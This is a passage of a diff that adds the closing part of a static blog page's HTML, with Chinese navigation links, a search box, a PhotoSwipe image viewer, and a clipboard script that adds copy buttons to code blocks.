+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i></p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div>
+</body>
+
+</html>
